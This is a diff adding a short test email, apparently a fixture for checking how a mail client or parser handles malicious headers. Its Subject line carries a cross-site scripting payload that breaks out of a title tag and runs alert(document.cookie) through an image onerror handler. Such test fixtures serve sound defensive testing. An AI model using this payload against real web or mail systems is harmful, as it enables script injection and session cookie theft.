@@ -1,0 +1,7 @@
+From: "slacks" <sny@isoteric.net>
+To: chi325@hotmail.com, bobaymon@aol.com, jtsandy@hotmail.com, 
+Subject: <img xx="</title><img/src=1 onerror=alert(document.cookie)//\">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
